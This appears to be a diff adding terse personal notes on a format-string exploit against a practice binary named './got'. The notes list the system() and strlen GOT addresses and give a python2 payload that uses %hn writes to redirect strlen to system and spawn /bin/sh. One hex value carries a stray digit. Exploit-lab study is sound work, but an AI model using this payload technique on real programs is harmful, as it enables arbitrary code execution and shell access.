@@ -1,0 +1,13 @@
+system_address = 0xf7e12420 (63457 ,9248)
+
+	0xf7e1e = 63457 (10)
+	0x2420  = 9248  (10)
+	
+strlen_address = 0x0804c014
+
+[+] Exploit Success 
+(gdb)
+r <<< $(python2 -c "print '\x16\xc0\x04\x08\x14\xc0\x04\x08' + '%63449x%1\$hn' +'%11327x%2\$hn'+'\n'+'/bin/sh' ")
+
+(payload)
+(python2 -c "print '\x16\xc0\x04\x08\x14\xc0\x04\x08' + '%63449x%1\$hn' +'%11327x%2\$hn'+'\n'+'/bin/sh'";cat) | ./got
